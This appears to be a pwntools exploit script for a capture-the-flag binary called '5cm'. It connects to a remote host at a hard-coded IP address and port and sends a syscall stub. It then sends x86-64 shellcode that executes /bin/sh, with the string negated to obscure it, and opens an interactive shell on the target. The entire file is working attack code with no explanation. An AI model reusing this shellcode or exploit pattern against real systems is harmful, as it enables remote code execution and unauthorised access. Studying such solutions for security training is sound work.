from pwn import *
import time
#r = process("./5cm")
r = remote('125.235.240.168', 27019)
raw_input("?")
payload = "\x0F\x05"
r.send(payload)
time.sleep(2)
payload = "\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
r.sendline(payload)
r.interactive()
